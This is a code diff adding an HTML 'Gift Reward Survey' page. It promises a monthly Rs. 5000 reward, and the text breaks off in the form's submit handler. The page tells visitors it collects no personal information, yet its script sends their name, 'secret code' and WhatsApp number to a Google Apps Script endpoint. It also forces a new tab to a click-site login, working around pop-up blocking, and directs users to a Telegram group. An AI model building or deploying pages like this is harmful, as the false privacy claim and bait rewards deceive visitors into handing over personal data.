@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Reward Survey</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000;
+            color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            overflow-x: hidden;
+        }
+        .container {
+            background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 
+                        0 0 30px rgba(212, 175, 55, 0.2);
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #D4AF37, #F9A825, #D4AF37, #F9A825);
+            background-size: 300% 100%;
+            animation: gradientShift 3s ease infinite;
+            box-shadow: 0 0 10px #D4AF37;
+        }
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            color: #D4AF37;
+            font-size: 32px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.7);
+            letter-spacing: 1px;
+        }
+        .header p {
+            color: #cccccc;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        .header .privacy-text {
+            color: #aaaaaa;
+            font-size: 13px;
+            max-width: 90%;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+        .gift-icon {
+            font-size: 48px;
+            color: #D4AF37;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.7);
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #D4AF37;
+            font-weight: 600;
+            font-size: 16px;
+            text-shadow: 0 0 5px rgba(212, 175, 55, 0.5);
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid rgba(212, 175, 55, 0.3);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.5);
+            color: #f5f5f5;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #D4AF37;
+            background: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+        }
+        .form-group textarea {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid rgba(212, 175, 55, 0.3);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.5);
+            color: #f5f5f5;
+            resize: vertical;
+            min-height: 120px;
+        }
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #D4AF37;
+            background: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+        }
+        .optional {
+            font-size: 12px;
+            color: #888;
+            margin-left: 5px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #D4AF37 0%, #F9A825 100%);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4);
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(212, 175, 55, 0.6);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: 10px;
+            color: #000;
+            font-weight: 600;
+            z-index: 1000;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            max-width: 80%;
+            background: linear-gradient(135deg, #D4AF37, #F9A825);
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4);
+        }
+        .notification.show {
+            transform: translateX(0);
+        }
+        .notification.error {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+        }
+        .reward-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            padding: 15px;
+        }
+        .reward-content {
+            background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            position: relative;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 
+                        0 0 30px rgba(212, 175, 55, 0.2);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .gift-animation {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        .gift-box {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #D4AF37, #F9A825);
+            border-radius: 10px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: giftPulse 1s infinite;
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.7);
+        }
+        .gift-box::before {
+            content: '';
+            position: absolute;
+            top: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 16px;
+            background: #F9A825;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.7);
+        }
+        .gift-box::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -8px;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 100px;
+            background: #F9A825;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.7);
+        }
+        @keyframes giftPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+        }
+        .sparkles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+        .sparkle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            animation: sparkle 2s infinite;
+            box-shadow: 0 0 10px currentColor;
+        }
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+        .group-links {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(212, 175, 55, 0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(212, 175, 55, 0.2);
+        }
+        .group-links h3 {
+            color: #D4AF37;
+            margin-bottom: 15px;
+            font-size: 20px;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+        }
+        .group-link {
+            display: inline-block;
+            margin: 8px;
+            padding: 12px 18px;
+            border-radius: 25px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            text-decoration: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        .telegram-link {
+            background: linear-gradient(135deg, #0088cc, #004d7a);
+            color: white;
+        }
+        .group-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
+        }
+        .click-counter {
+            background: rgba(212, 175, 55, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border-left: 4px solid #D4AF37;
+        }
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #aaaaaa;
+        }
+        .reward-amount {
+            color: #D4AF37;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 15px 0;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.7);
+        }
+        .reward-details {
+            color: #cccccc;
+            font-size: 16px;
+            margin: 10px 0;
+            line-height: 1.5;
+        }
+        .full-screen-gifts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 20000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .gift-animation-full {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .gift-item {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            border-radius: 10px;
+            animation: float 3s infinite ease-in-out;
+            box-shadow: 0 0 20px currentColor;
+            z-index: 1; /* Ensure gifts stay behind text */
+        }
+        .gift-item::before {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 70px;
+            height: 12px;
+            border-radius: 6px;
+            box-shadow: 0 0 10px currentColor;
+        }
+        .gift-item::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -6px;
+            transform: translateY(-50%);
+            width: 12px;
+            height: 70px;
+            border-radius: 6px;
+            box-shadow: 0 0 10px currentColor;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+        .reward-message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 10; /* Ensure text stays on top */
+            background: rgba(0, 0, 0, 0.7); /* Add semi-transparent background for better readability */
+            padding: 20px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+        }
+        .reward-message h2 {
+            font-size: 42px;
+            color: #D4AF37;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.8);
+        }
+        .reward-message p {
+            font-size: 24px;
+            color: #f5f5f5;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        .countdown {
+            color: #4ecdc4;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        .important-note {
+            color: #ff6b6b;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .telegram-note {
+            color: #0088cc;
+            font-size: 12px;
+            margin-top: 8px;
+            font-style: italic;
+        }
+        .telegram-container {
+            margin-top: 15px;
+        }
+        .special-requirements {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(212, 175, 55, 0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(212, 175, 55, 0.2);
+        }
+        .special-requirements h3 {
+            color: #D4AF37;
+            margin-bottom: 15px;
+            font-size: 18px;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+        }
+        .word-count {
+            text-align: right;
+            color: #aaaaaa;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        .instruction-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 15000;
+            padding: 15px;
+        }
+        .instruction-content {
+            background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            position: relative;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 
+                        0 0 30px rgba(212, 175, 55, 0.2);
+        }
+        .instruction-icon {
+            font-size: 64px;
+            color: #D4AF37;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.7);
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .instruction-content h2 {
+            color: #D4AF37;
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.7);
+        }
+        .instruction-content p {
+            color: #f5f5f5;
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .instruction-highlight {
+            background: rgba(212, 175, 55, 0.15);
+            border-left: 4px solid #D4AF37;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 10px 10px 0;
+            font-size: 16px;
+            color: #f5f5f5;
+        }
+        .instruction-highlight strong {
+            color: #D4AF37;
+            font-weight: bold;
+        }
+        .continue-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #4ecdc4, #2a9d8f);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(78, 205, 196, 0.4);
+        }
+        .continue-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(78, 205, 196, 0.6);
+        }
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+        .continue-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+        .continue-btn:hover::before {
+            left: 100%;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px 20px;
+            }
+            
+            .header h1 {
+                font-size: 28px;
+            }
+            
+            .gift-icon {
+                font-size: 40px;
+            }
+            
+            .form-group input, .form-group textarea {
+                padding: 12px;
+                font-size: 15px;
+            }
+            
+            .submit-btn, .continue-btn {
+                padding: 15px;
+                font-size: 16px;
+            }
+            
+            .notification {
+                top: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+            
+            .reward-content, .instruction-content {
+                padding: 25px 20px;
+                max-height: 85vh;
+            }
+            
+            .group-link {
+                display: block;
+                margin: 10px 0;
+                width: 100%;
+            }
+            
+            .reward-message h2 {
+                font-size: 32px;
+            }
+            
+            .reward-message p {
+                font-size: 20px;
+            }
+            
+            .instruction-content h2 {
+                font-size: 24px;
+            }
+            
+            .instruction-content p {
+                font-size: 16px;
+            }
+            
+            /* Custom scrollbar for mobile */
+            .reward-content::-webkit-scrollbar,
+            .instruction-content::-webkit-scrollbar {
+                width: 6px;
+            }
+            
+            .reward-content::-webkit-scrollbar-track,
+            .instruction-content::-webkit-scrollbar-track {
+                background: rgba(0, 0, 0, 0.1);
+                border-radius: 10px;
+            }
+            
+            .reward-content::-webkit-scrollbar-thumb,
+            .instruction-content::-webkit-scrollbar-thumb {
+                background: rgba(212, 175, 55, 0.5);
+                border-radius: 10px;
+            }
+            
+            .reward-content::-webkit-scrollbar-thumb:hover,
+            .instruction-content::-webkit-scrollbar-thumb:hover {
+                background: rgba(212, 175, 55, 0.7);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="gift-icon">
+                <i class="fas fa-gift"></i>
+            </div>
+            <h1>🎁 Gift Reward Survey</h1>
+            <p>Enter your details to claim your special rewards!</p>
+            <p class="privacy-text">We respect your privacy. We do not collect, store, or share any personal information from this survey. This is a legitimate reward system, and we value your trust.</p>
+        </div>
+        <form id="surveyForm">
+            <div class="form-group">
+                <label for="name">
+                    <i class="fas fa-user"></i> Full Name
+                </label>
+                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label for="secret">
+                    <i class="fas fa-key"></i> Secret Code
+                </label>
+                <input type="text" id="secret" name="secret" placeholder="Enter your secret code" required>
+            </div>
+            <div class="form-group">
+                <label for="whatsapp">
+                    <i class="fab fa-whatsapp"></i> WhatsApp Number <span class="optional">(Optional)</span>
+                </label>
+                <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter your WhatsApp number">
+            </div>
+            <button type="submit" class="submit-btn">
+                <i class="fas fa-magic"></i> Click to Get Rewards
+            </button>
+        </form>
+    </div>
+    <div class="notification" id="notification"></div>
+    <div class="full-screen-gifts" id="fullScreenGifts">
+        <div class="gift-animation-full" id="giftAnimationFull">
+            <div class="reward-message">
+                <h2>🎉 Congratulations! 🎉</h2>
+                <p>Your rewards will be selected based on your activity</p>
+                <div class="reward-amount">Monthly Reward: Rs. 5000</div>
+                <div class="reward-details">
+                    Daily Mobile Recharge & Weekly Small Gifts
+                </div>
+                <div class="countdown">Opening reward page in <span id="timer">4</span> seconds...</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Instruction Modal -->
+    <div class="instruction-modal" id="instructionModal">
+        <div class="instruction-content">
+            <button class="close-btn" onclick="closeInstructionModal()">&times;</button>
+            <div class="instruction-icon">
+                <i class="fas fa-info-circle"></i>
+            </div>
+            <h2>Important Instructions</h2>
+            <p>Thank you for your participation! Please read the following instructions carefully before proceeding.</p>
+            <div class="instruction-highlight">
+                <strong>Important:</strong> If a link automatically opens in a new tab, please <strong>ignore it</strong> and return to this page for the next step.
+            </div>
+            <p>Your reward information will be displayed right here after you complete the process.</p>
+            <button type="button" class="continue-btn" onclick="proceedToReward()">
+                <i class="fas fa-arrow-right"></i> Continue to Reward
+            </button>
+        </div>
+    </div>
+    
+    <div class="reward-modal" id="rewardModal">
+        <div class="reward-content">
+            <button class="close-btn" onclick="closeRewardModal()">&times;</button>
+            
+            <div class="gift-animation">
+                <div class="gift-box"></div>
+                <div class="sparkles" id="sparkles"></div>
+            </div>
+            <h2>🎉 Congratulations! 🎉</h2>
+            <p>Your rewards will be selected based on your activity</p>
+            <div class="reward-amount">Monthly Reward: Rs. 5000</div>
+            <div class="reward-details">
+                Daily Mobile Recharge & Weekly Small Gifts
+            </div>
+            <div class="click-counter" id="clickCounter">
+                <strong>Today's Activity:</strong> <span id="clickCount">0</span> clicks
+            </div>
+            
+            <div class="special-requirements">
+                <h3><i class="fas fa-star"></i> Special Requirements</h3>
+                <p>If you have any special need or requirement under our limit, tell us with your details and we will consider:</p>
+                <div class="form-group">
+                    <textarea id="specialRequirements" placeholder="Enter your special requirements here (maximum 100 words)" maxlength="600"></textarea>
+                    <div class="word-count"><span id="wordCount">0</span>/100 words</div>
+                </div>
+                <button type="button" class="submit-btn" onclick="submitSpecialRequirements()">
+                    <i class="fas fa-paper-plane"></i> Submit Requirements
+                </button>
+            </div>
+            
+            <div class="group-links">
+                <h3>📱 Join Our Telegram Group to Claim Your Reward!</h3>
+                <p>Send your code with today's click count to claim your reward:</p>
+                <div id="codeDisplay" style="font-family: monospace; font-size: 18px; font-weight: bold; color: #D4AF37; margin: 15px 0; text-shadow: 0 0 10px rgba(212, 175, 55, 0.7);"></div>
+                
+                <div class="telegram-container">
+                    <a href="https://t.me/YOUR_TELEGRAM_GROUP_LINK" class="group-link telegram-link" target="_blank">
+                        <i class="fab fa-telegram"></i> Join Telegram Group
+                    </a>
+                    <div class="telegram-note">
+                        <i class="fas fa-info-circle"></i> Telegram allows you to join groups without sharing your contact number, ensuring your privacy is protected.
+                    </div>
+                </div>
+                
+                <div class="important-note">
+                    <i class="fas fa-exclamation-circle"></i> Important: Join our Telegram group to claim your reward
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Google Sheets Web App URL
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby94pIfvzyBKody5J60-3VgTuilTs_KwN3aW_QQfwxJJAz9KT9DFytLRp2F_xh5g-E-/exec";
+        
+        let clickCount = 0;
+        let rewardTab = null;
+        let countdownInterval = null;
+        let previousPageTimer = null;
+        let generatedCode = '';
+        
+        // Load click count from localStorage
+        function loadClickCount() {
+            const today = new Date().toDateString();
+            const savedData = localStorage.getItem('giftSurveyData');
+            
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                if (data.date === today) {
+                    clickCount = data.count;
+                } else {
+                    // Reset count for new day
+                    clickCount = 0;
+                    localStorage.setItem('giftSurveyData', JSON.stringify({ date: today, count: 0 }));
+                }
+            } else {
+                localStorage.setItem('giftSurveyData', JSON.stringify({ date: today, count: 0 }));
+            }
+            
+            // Update the display
+            document.getElementById('clickCount').textContent = clickCount;
+        }
+        
+        // Update click count
+        function updateClickCount() {
+            const today = new Date().toDateString();
+            clickCount++;
+            localStorage.setItem('giftSurveyData', JSON.stringify({ date: today, count: clickCount }));
+            document.getElementById('clickCount').textContent = clickCount;
+        }
+        
+        // Show notification
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `notification ${type}`;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Save data to Google Sheets
+        function saveDataToGoogleSheets(name, secret, whatsapp, specialRequirements) {
+            showNotification('Saving your data...', 'success');
+            
+            // Generate a unique ID
+            const id = Date.now().toString();
+            
+            // Prepare data to send
+            const data = {
+                name: name,
+                secret: secret,
+                whatsapp: whatsapp,
+                specialRequirements: specialRequirements,
+                id: id,
+                clickCount: clickCount
+            };
+            
+            // Send data to Google Sheets
+            fetch(WEB_APP_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Required for Google Apps Script
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                console.log("Data sent successfully");
+                showNotification('Your data has been saved successfully!', 'success');
+                localStorage.setItem('currentEntryId', id);
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+                showNotification('Error saving your data. Please try again.', 'error');
+            });
+        }
+        
+        // Update special requirements in Google Sheets
+        function updateSpecialRequirementsInGoogleSheets(id, requirements) {
+            showNotification('Submitting your requirements...', 'success');
+            
+            // Prepare data to send
+            const data = {
+                id: id,
+                specialRequirements: requirements
+            };
+            
+            // Send update request to Google Sheets
+            fetch(`${WEB_APP_URL}?action=update`, {
+                method: 'POST',
+                mode: 'no-cors', // Required for Google Apps Script
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                showNotification('Your special requirements have been submitted successfully. We will consider them.', 'success');
+                
+                // Clear the textarea
+                document.getElementById('specialRequirements').value = '';
+                updateWordCount();
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+                showNotification('Error saving your requirements. Please try again.', 'error');
+            });
+        }
+        
+        // Create sparkles animation
+        function createSparkles() {
+            const sparklesContainer = document.getElementById('sparkles');
+            sparklesContainer.innerHTML = '';
+            
+            const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#f0932b', '#eb4d4b', '#6c5ce7', '#a29bfe'];
+            
+            for (let i = 0; i < 20; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.className = 'sparkle';
+                sparkle.style.left = Math.random() * 100 + '%';
+                sparkle.style.top = Math.random() * 100 + '%';
+                sparkle.style.color = colors[Math.floor(Math.random() * colors.length)];
+                sparkle.style.animationDelay = Math.random() * 2 + 's';
+                sparklesContainer.appendChild(sparkle);
+            }
+        }
+        
+        // Create full screen gift animation
+        function createFullScreenGiftAnimation() {
+            const container = document.getElementById('giftAnimationFull');
+            container.innerHTML = `
+                <div class="reward-message">
+                    <h2>🎉 Congratulations! 🎉</h2>
+                    <p>Your rewards will be selected based on your activity</p>
+                    <div class="reward-amount">Monthly Reward: Rs. 5000</div>
+                    <div class="reward-details">
+                        Daily Mobile Recharge & Weekly Small Gifts
+                    </div>
+                    <div class="countdown">Opening reward page in <span id="timer">4</span> seconds...</div>
+                </div>
+            `;
+            
+            // Create floating gifts with random colors
+            const colors = [
+                '#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#f0932b', 
+                '#eb4d4b', '#6c5ce7', '#a29bfe', '#fd79a8', '#fdcb6e'
+            ];
+            
+            for (let i = 0; i < 30; i++) {
+                const gift = document.createElement('div');
+                gift.className = 'gift-item';
+                gift.style.left = Math.random() * 100 + '%';
+                gift.style.top = Math.random() * 100 + '%';
+                gift.style.animationDelay = Math.random() * 3 + 's';
+                gift.style.animationDuration = (3 + Math.random() * 2) + 's';
+                
+                // Random color for gift
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                gift.style.background = `linear-gradient(135deg, ${color}, ${color}dd)`;
+                gift.style.color = color;
+                
+                container.appendChild(gift);
+            }
+        }
+        
+        // Submit special requirements
+        function submitSpecialRequirements() {
+            const requirements = document.getElementById('specialRequirements').value.trim();
+            
+            if (requirements.length === 0) {
+                showNotification('Please enter your special requirements before submitting.', 'error');
+                return;
+            }
+            
+            // Count words
+            const words = requirements.split(/\s+/).filter(word => word.length > 0);
+            if (words.length > 100) {
+                showNotification('Your requirements exceed the 100-word limit. Please shorten your text.', 'error');
+                return;
+            }
+            
+            // Get entry ID from localStorage
+            const entryId = localStorage.getItem('currentEntryId');
+            if (!entryId) {
+                showNotification('Error: Could not find your record. Please try again.', 'error');
+                return;
+            }
+            
+            // Update special requirements in Google Sheets
+            updateSpecialRequirementsInGoogleSheets(entryId, requirements);
+        }
+        
+        // Update word count
+        function updateWordCount() {
+            const text = document.getElementById('specialRequirements').value;
+            const words = text.trim() === '' ? 0 : text.trim().split(/\s+/).length;
+            document.getElementById('wordCount').textContent = words;
+        }
+        
+        // Close instruction modal
+        function closeInstructionModal() {
+            document.getElementById('instructionModal').style.display = 'none';
+        }
+        
+        // Proceed to reward after instruction
+        function proceedToReward() {
+            closeInstructionModal();
+            
+            // Try to open the link using multiple methods
+            const rewardLink = 'https://www.star-clicks.com/login';
+            
+            // Method 1: Try window.open
+            try {
+                rewardTab = window.open(rewardLink, '_blank');
+                
+                // If window.open fails, try Method 2
+                if (!rewardTab || rewardTab.closed || typeof rewardTab.closed === 'undefined') {
+                    throw new Error('Popup blocked');
+                }
+            } catch (e) {
+                // Method 2: Create and click a temporary link
+                const tempLink = document.createElement('a');
+                tempLink.href = rewardLink;
+                tempLink.target = '_blank';
+                tempLink.rel = 'noopener noreferrer';
+                document.body.appendChild(tempLink);
+                tempLink.click();
+                document.body.removeChild(tempLink);
+            }
+            
+            // Show reward modal
+            const modal = document.getElementById('rewardModal');
+            const codeDisplay = document.getElementById('codeDisplay');
+            
+            codeDisplay.textContent = `${generatedCode} - ${clickCount} times`;
+            
+            createSparkles();
+            modal.style.display = 'flex';
+            
+            // Listen for tab close (if we can detect it)
+            if (rewardTab) {
+                const checkTabClosed = setInterval(() => {
+                    try {
+                        if (rewardTab.closed) {
+                            clearInterval(checkTabClosed);
+                            showNotification('Join our Telegram group to claim your reward.', 'success');
+                            
+                            // Keep the previous page open for 3 seconds after the reward tab is closed
+                            clearTimeout(previousPageTimer);
+                            previousPageTimer = setTimeout(() => {
+                                showNotification('Thank you for participating!', 'success');
+                            }, 3000);
+                        }
+                    } catch (e) {
+                        // If we can't access the tab, assume it's closed
+                        clearInterval(checkTabClosed);
+                        showNotification('Join our Telegram group to claim your reward.', 'success');
+                        
+                        // Keep the previous page open for 3 seconds after the reward tab is closed
+                        clearTimeout(previousPageTimer);
+                        previousPageTimer = setTimeout(() => {
+                            showNotification('Thank you for participating!', 'success');
+                        }, 3000);
+                    }
+                }, 1000);
+            } else {
+                // If we couldn't open a tab, show notification immediately
+                setTimeout(() => {
+                    showNotification('Join our Telegram group to claim your reward.', 'success');
+                    
+                    // Keep the previous page open for 3 seconds
+                    clearTimeout(previousPageTimer);
+                    previousPageTimer = setTimeout(() => {
+                        showNotification('Thank you for participating!', 'success');
+                    }, 3000);
+                }, 1000);
+            }
+        }
+        
+        // Open reward tab with improved method
+        function openRewardTab(code) {
+            // Store the generated code for later use
+            generatedCode = code;
+            
+            // Update click count
+            updateClickCount();
+            
+            // Show full screen gift animation
+            const fullScreenGifts = document.getElementById('fullScreenGifts');
+            createFullScreenGiftAnimation();
+            fullScreenGifts.style.display = 'flex';
+            
+            // Start countdown
+            let timeLeft = 4;
+            const timerElement = document.getElementById('timer');
+            
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    
+                    // Hide full screen animation and show instruction modal
+                    fullScreenGifts.style.display = 'none';
+                    
+                    // Show instruction modal
+                    const instructionModal = document.getElementById('instructionModal');
+                    instructionModal.style.display = 'flex';
+                }
+            }, 1000);
+        }
+        
+        // Close reward modal
+        function closeRewardModal() {
+            document.getElementById('rewardModal').style.display = 'none';
+        }
+        
+        // Event listeners
+        document.getElementById('surveyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const secret = document.getElementById('secret').value;
+            const whatsapp = document.getElementById('whatsapp').value;
+            
+            // Validate inputs
+            if (name.length < 4) {
+                showNotification('Name must be at least 4 characters long.', 'error');
+                return;
+            }
+            
+            if (secret.length < 4) {
+                showNotification('Secret code must be at least 4 characters.', 'error');
+                return;
+            }
+            
+            // WhatsApp is optional, but if provided, validate it
+            if (whatsapp && whatsapp.length < 10) {
+                showNotification('Please enter a valid WhatsApp number or leave it empty.', 'error');
+                return;
+            }
+            
+            // Generate code
+            const namePart = name.substring(0, 4).toUpperCase();
+            const secretPart = secret.slice(-4);
+            const code = namePart + secretPart;
+            
+            // Save data to Google Sheets
